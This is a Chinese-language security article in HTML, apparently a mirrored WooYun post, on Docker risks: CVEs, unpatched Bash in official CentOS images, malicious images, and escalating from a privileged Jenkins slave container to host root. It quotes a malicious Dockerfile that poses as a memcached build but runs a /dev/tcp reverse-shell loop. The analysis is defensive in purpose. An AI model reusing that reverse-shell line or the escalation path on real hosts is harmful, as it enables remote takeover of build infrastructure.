@@ -1,0 +1,396 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Docker安全那些事 - 为程序员服务</title>
+    <meta charset="utf-8">
+</head>
+<body>
+<h1>Docker安全那些事 - 为程序员服务</h1>
+
+<p>
+ <img  alt="docker" src="http://static.wooyun.org//drops/20160704/2016070406003850049110.png" onerror="return imgError(this)">
+</p>
+<h1>
+ 0x00 前言
+</h1>
+<hr/>
+<p>
+ 在过去的一年，容器正在以惊人的速度发展，国内也有大量互联网公司在生产环境中使用Docker，其中也不乏万台规模的。前些日子乌云曝出Swarm配置问题造成的安全隐患，也让大家对Docker安全提起了关注，本文主要从“Docker自身安全”，“DockerImages安全”和“Docker使用安全隐患”来聊一聊Docker安全那些事。
+</p>
+<h1>
+ 0x01 Docker自身安全
+</h1>
+<hr/>
+<p>
+ 归总结了下CVE中关于Docker的漏洞报告,结果如下：
+</p>
+<table>
+ <thead>
+  <tr>
+   <th>
+    序号
+   </th>
+   <th align="center">
+    CVE编号
+   </th>
+   <th align="center">
+    漏洞版本
+   </th>
+   <th align="right">
+    漏洞名称
+   </th>
+  </tr>
+ </thead>
+ <tbody>
+  <tr>
+   <td>
+    1
+   </td>
+   <td align="center">
+    CVE-2015-3630
+   </td>
+   <td align="center">
+    1.6.0
+   </td>
+   <td align="right">
+    Docker Libcontainer 安全绕过漏洞
+   </td>
+  </tr>
+  <tr>
+   <td>
+    2
+   </td>
+   <td align="center">
+    CVE-2015-3627
+   </td>
+   <td align="center">
+    1.6.1
+   </td>
+   <td align="right">
+    Libcontainer和Docker Engine 权限许可和访问控制漏洞
+   </td>
+  </tr>
+  <tr>
+   <td>
+    3
+   </td>
+   <td align="center">
+    CVE-2015-3630
+   </td>
+   <td align="center">
+    1.6.1
+   </td>
+   <td align="right">
+    Docker Engine 安全绕过漏洞
+   </td>
+  </tr>
+  <tr>
+   <td>
+    4
+   </td>
+   <td align="center">
+    CVE-2014-9358
+   </td>
+   <td align="center">
+    1.3.3
+   </td>
+   <td align="right">
+    Docker 目录遍历漏洞
+   </td>
+  </tr>
+  <tr>
+   <td>
+    5
+   </td>
+   <td align="center">
+    CVE-2014-9357
+   </td>
+   <td align="center">
+    1.3.2
+   </td>
+   <td align="right">
+    Docker 权限许可和访问控制漏洞
+   </td>
+  </tr>
+  <tr>
+   <td>
+    6
+   </td>
+   <td align="center">
+    CVE-2014-6408
+   </td>
+   <td align="center">
+    1.3.1
+   </td>
+   <td align="right">
+    Docker 权限许可和访问控制漏洞
+   </td>
+  </tr>
+  <tr>
+   <td>
+    7
+   </td>
+   <td align="center">
+    CVE-2014-5277
+   </td>
+   <td align="center">
+    1.3.0
+   </td>
+   <td align="right">
+    Docker和docker-py 代码注入漏洞
+   </td>
+  </tr>
+ </tbody>
+</table>
+<p>
+ 全部漏洞：
+ <a href="https://docs.docker.com/engine/security/non-events/">
+  https://docs.docker.com/engine/security/non-events/
+ </a>
+</p>
+<p>
+ 可以发现Docker存在问题的版本分别在1.3和1.6，因为权限控制等问题导致可以脱离容器拿到宿主机权限。Docker在6月发布了最新版本1.12版本，从1.6到如今的1.12都未爆出漏洞的情况（排除Oday可能）。基于Docker本身来讲安全行可以保障的，无论是容器的隔离还是资源限制容器都有着很出色的表现，更多的安全隐患发生在使用者上，因为没有正确的使用容器或者配置出错导致了容器的危险运行。
+</p>
+<h1>
+ 0x02 DockerImages安全
+</h1>
+<hr/>
+<p>
+ 容器的环境是基于容器镜像，一旦容器镜像存在风险那么容器的安全性也要大打折扣了。我们在看容器镜像又是根据Dockerfile一层层叠加的，如下图：
+</p>
+<p>
+ <img  alt="docker_image" src="http://static.wooyun.org//drops/20160704/201607040600395699926.png" onerror="return imgError(this)">
+</p>
+<p>
+ 底层Base镜像引用“atiger77:1.0”，第二层镜像在此之上添加run.sh脚本到容器目录中，第三层镜像是指在容器运行时执行run.sh脚本。Docker镜像有自己的缓存机制，构建时会逐层往上进行检查，底层镜像如果没有产生变动，则跳过构建使用镜像Cache来节省构建时间，如果检测到变动则开始进行构建动作。
+</p>
+<p>
+ 这里主要分两种情况来讨论容器镜像的安全。
+</p>
+<ol>
+ <li>
+  SoftwareVulnerability（镜像中使用的软件存在高危漏洞）
+ </li>
+ <li>
+  BadImages（存在后门的容器镜像）
+ </li>
+</ol>
+<h3>
+ 1.SoftwareVulnerability
+</h3>
+<p>
+ 还是根据刚才的镜像分层来说，底层Base镜像中如果使用的软件存在高危漏洞，那么所有使用Base镜像所构建出的镜像都会存在问题。我们来举个栗子：
+</p>
+<p>
+ <img  alt="docker_file" src="http://static.wooyun.org//drops/20160704/20160704060041468623.jpg" onerror="return imgError(this)">
+</p>
+<p>
+ 上图中Base镜像只安装基础依赖组件,其中软件包abc有高危漏洞。根据Base镜像打出需要的镜像，左边的镜像是添加了代码目录到容器中，右边则构建了一个编译gcc的基础镜像。那么当Base镜像中的abc软件存在高危漏洞，那么所有相关依赖的镜像就都存在了风险。当出现这种情况时，需要先修复Base镜像中的问题软件，完成后一次对依赖的镜像重新进行构建动作。
+</p>
+<p>
+ 根据上述情况，我分别从dockerhub和github中下载了部分镜像进行真实测试，
+</p>
+<p>
+ 测试漏洞：Bash漏洞，测试代码：
+ <a href="https://github.com/hannob/bashcheck/blob/master/bashcheck">
+  https://github.com/hannob/bashcheck/blob/master/bashcheck
+ </a>
+</p>
+<p>
+ 测试版本：
+ <br/>
+ 分别使用官方镜像进行测试，版本为centos5.11/6.6/7.2
+</p>
+<p>
+ <img  alt="docker_images_all" src="http://static.wooyun.org//drops/20160704/20160704060043784424.jpg" onerror="return imgError(this)">
+</p>
+<p>
+ 测试过程:
+</p>
+<p>
+ Version:5.11
+ <img  alt="images_centos_5" src="http://static.wooyun.org//drops/20160704/20160704060045634965.jpg" onerror="return imgError(this)">
+</p>
+<p>
+ Version:6.6
+ <img  alt="images_centos_6" src="http://static.wooyun.org//drops/20160704/20160704060047691826.jpg" onerror="return imgError(this)">
+</p>
+<p>
+ Version:7.2
+ <img  alt="images_centos_7" src="http://static.wooyun.org//drops/20160704/20160704060049878767.jpg" onerror="return imgError(this)">
+</p>
+<p>
+ 测试结果：
+ <br/>
+ 从测试结果可以看到官网下载的centos5.11和centos6.6都存在BASH漏洞(CVE-2014-6277)。查看了下CVE记录时间为2014年9月9日，官方给出的centos6.6上次更新时间是2015年的5月4日然后并没有修复该漏洞。
+</p>
+<p>
+ CVE报告时间：
+ <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6277">
+  https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6277
+ </a>
+</p>
+<p>
+ Docker-Centos6.6官方dockerfile地址：
+ <a href="https://github.com/CentOS/sig-cloud-instance-images/blob/8911843d9a6cc71aadd81e491f94618aded94f30/docker/Dockerfile">
+  https://github.com/CentOS/sig-cloud-instance-images/blob/8911843d9a6cc71aadd81e491f94618aded94f30/docker/Dockerfile
+ </a>
+</p>
+<p>
+ 虽然Base镜像已然存在这个漏洞，但是容器用来跑服务的，一般情况下是不需要进入容器进行操作的，这里我演示的只是一个通用漏洞，当然还会存在其他服务的漏洞容器镜像，这里还是给出自己的建议，公司使用容器基础镜像需要自己构建，保证Base镜像的干净和安全，现在也有很多小伙伴开始使用alpine的镜像，一个centos也就几十M搞定了。
+</p>
+<p>
+ 其实到这边容器安全都是在可控范围内的，即使使用的服务或者应用有问题使得攻击者上传了webshell，操作的范围也只是在容器内并不会对宿主机产生影响，那么容器就真的安全了嘛？也不尽然，下面我会讲如何通过容器拿到宿主机权限。
+</p>
+<h3>
+ 2.BadImages
+</h3>
+<p>
+ BadImages不是值“坏掉的镜像”而是说那些“恶意镜像”，翻了下乌云所有带“Docker”和“容器”关键字的漏洞，大部分提交的漏洞都是通过Swarm没有配置正确，从而通过远程API实现了未授权访问，相关的解法可以参考“黑客，绝对是黑客”之前写的文章（
+ <a href="http://ju.outofmemory.cn/entry/260131">
+  http://drops.wooyun.org/papers/15892
+ </a>
+ ）。在所有Docker的容器中发现一个比较有意思的，利用自己编写的dockerfile执行反弹shell拿到了某公有云一台机器，让我们看下章总的dockerfile
+</p>
+<pre><code>FROM ubuntu
+MAINTAINER Victor Coisne victor.coisne@dotcloud.com
+RUN sleep 1
+RUN cat /etc/passwd
+RUN echo "deb http://mirrors.163.com/ubuntu/ precise main restricted universe multiverse" &gt; /etc/apt/sources.list
+RUN apt-get update
+RUN echo "while ((1));do sleep 1;echo 111;/bin/sh -i &gt;&amp; /dev/tcp/1.1.1.1/1234 0&gt;&amp;1;done" &gt;&gt; /tmp/1.sh
+RUN bash /tmp/1.sh
+RUN sleep 20
+RUN apt-get install -y memcached
+ENTRYPOINT ["memcached"]
+USER daemon
+EXPOSE 11211
+</code></pre>
+<p>
+ 第一眼看是启动memcached的一个dockerfile，仔细一看发现其中别有洞天，在构建过程中存在了一个反弹shell，由于该厂商自有服务的api没有和用户环境隔离做很好的隔离导致反弹shell成功。
+</p>
+<p>
+ 我们来分析一下这种情况带来的危害，网上很多的说法都是不要使用非官方的镜像，其实也不尽然官方镜像也不是完全没有问题这一点之前也分析过了,在我看来非官方的镜像不是不能用，只是有些镜像作者没有写任何的介绍或者使用方法，dockerfile也不上传这类镜像还是不建议使用了，有介绍的镜像还是花点时间看下dockerfile的写法到底安装和执行了哪些内容。当然容器相比传统的宿主机而言安全性是更好的,这也要归功于容器的快速迭代，使用容器可以加快整个开发交付流程，即使容器被挂了webshell几天后版本更新会上就会启动一个新的容器，之前的容器也不复存在了。
+</p>
+<h1>
+ 0x03 Docker使用安全隐患
+</h1>
+<hr/>
+<p>
+ Docker本身的安全性是值得信赖的，更多的还是人为使用的错误导致了安全隐患，大家印象里都对Swarm没有正确配置导致的安全问题比较了解，使用Swarm的同学可以参考下阿里容器服务的玩法，Swarm配置了tls，用户连接自己Swarm的时候，需要下载证书，使用证书才能和swarm建立tls连接。这里我会讲另一个docker使用场景中会出现的安全隐患以及一些使用docker的注意事项。
+</p>
+<p>
+ Docker的出现加快了整个开发-测试-上线流程，其中我们会使用Jenkins来做持续化集成的工作，简化流程大致如下(这里只介绍大概流程让大家有个印象，省去详细的流程)：
+</p>
+<p>
+ 1.开发本地编写代码，开发环境通过 --&gt; 2.测试环境进行UT等其他测试，测试环境通过 --&gt; 3.发布线上环境
+</p>
+<p>
+ 当容器用在生产环境中，那么作为Jenkins而言就起到了CICD的作用，通过Jenkins-Master接受任务分配给对应Slave执行,通过后并将代码打包到镜像中发送上线。
+</p>
+<p>
+ 让我们看一下大致的Compose文件长什么样：
+</p>
+<p>
+ <img  alt="jenkins_compose" src="http://static.wooyun.org//drops/20160704/20160704060050135728.jpg" onerror="return imgError(this)">
+</p>
+<p>
+ compose运行在jenkins中设置完毕,主就可以把任务分配给从,并且由从进行测试构建编译打包成容器等动作。为了让jenkins-slave能在编译完成后在宿主机中打镜像而不是在容器内部，在compose中从挂卷将宿主机的/var/run/docker.sock挂到了容中,并且赋予了"privileged"权限，这个写法其实并没有什么问题，为了让从能构建镜像所以赋予root权限,恰恰是这样一旦jenkins被攻破那么就会对宿主机的安全造成了威胁，这里拿测试环境给大家演示一下。
+</p>
+<p>
+ 环境：假设现在有一台Jenkins，攻击者通过爆破破解,弱密码尝试甚至没有密码的情况进入了Jenkins管理页面。
+</p>
+<p>
+ 攻击思路：由于jenkins-slave有着root权限，我们需要拿到jenkins-slave权限然后进行提权操作，从而获取宿主机权限。
+</p>
+<p>
+ 攻击过程：
+</p>
+<ol>
+ <li>
+  <p>
+   确定节电中已经添加slave
+  </p>
+  <p>
+   <img  alt="jenkins_hack_01" src="http://static.wooyun.org//drops/20160704/20160704060052160429.jpg" onerror="return imgError(this)">
+  </p>
+ </li>
+ <li>
+  <p>
+   添加任务并分配给slave
+  </p>
+  <p>
+   <img  alt="jenkins_hack_02" src="http://static.wooyun.org//drops/20160704/201607040600543747710.jpg" onerror="return imgError(this)">
+  </p>
+ </li>
+ <li>
+  <p>
+   查看Slave宿主机中存在的容器列表
+  </p>
+  <p>
+   <img  alt="jenkins_hack_03" src="http://static.wooyun.org//drops/20160704/201607040600566168511.jpg" onerror="return imgError(this)">
+  </p>
+  <p>
+   注：默认用户是jenkins,执行时需要加上sudo否则提示权限不足。这里可以看到拥有了privileged权限的slave容器获得了宿主机的权限。
+  </p>
+ </li>
+ <li>
+  <p>
+   在"Execute shell"中下载带有ssh服务的DockerImage
+  </p>
+  <p>
+   <img  alt="docker_hack_01.jpg" src="http://static.wooyun.org//drops/20160704/201607040600583391312.jpg" onerror="return imgError(this)">
+  </p>
+ </li>
+ <li>
+  <p>
+   对宿主机所在机器进行端口扫描，可以发现2016端口状态为open
+  </p>
+  <p>
+   <img  alt="docker_hack_02.jpg" src="http://static.wooyun.org//drops/20160704/201607040601009470813.jpg" onerror="return imgError(this)">
+  </p>
+  <p>
+   注释：本人是测试环境就写了内网IP。
+  </p>
+ </li>
+ <li>
+  <p>
+   登录宿主机2016端口添加公钥
+  </p>
+  <p>
+   <img  alt="docker_hack_03.jpg" src="http://static.wooyun.org//drops/20160704/201607040601021552014.jpg" onerror="return imgError(this)">
+  </p>
+ </li>
+ <li>
+  <p>
+   登录宿主机的22端口，获取宿主机权限
+  </p>
+  <p>
+   <img  alt="docker_hack_04.jpg" src="http://static.wooyun.org//drops/20160704/201607040601035762915.jpg" onerror="return imgError(this)">
+  </p>
+ </li>
+</ol>
+<p>
+ 加固方法：
+ <br/>
+ Docker搭配Jenkins使用为了加快交付流程必然会出现权限问题，这里提供一种解法尽量避免危害，首先jenkins不要放在公网上，登录接口可以使用JIRA插件，在JIRA中设置密码复杂度。
+</p>
+<p>
+ 其他想说的：
+</p>
+<p>
+ 这里还想提一下容器创建时一定要加上最大资源使用上限，容器在宿主机中就是个进程，一旦出现内存泄露或者Forkbomb类似的事件，宿主机的资源会消耗殆尽导致宿主机上的所有主机都不可用，建议在服务上线前先预估使用量。
+</p>
+<p>
+ Docker在操作者正确使用的情况下，安全性是可以得到保障的，就拿Jenkins的例子来说虽然开了privilege,要拿到宿主机的权限还是会碰到许许多多的问题,最后提权用了4天，尝试了37次构建，各种能想到的办法都用了,很多办法只能拿到容器层始终没办法提权到宿主机。
+</p>
+<p>
+ 写这篇文章也是最近公司在调研Docker，把碰到的一些问题和可能出现的安全隐患和大家交流下，有兴趣的童鞋可以加我一起研究。
+</p>
+<p>
+ 文章中若有错误的地方请各位同学斧正。未经本人允许请勿转载，谢谢。
+</p>
+
+</body>
+</html>
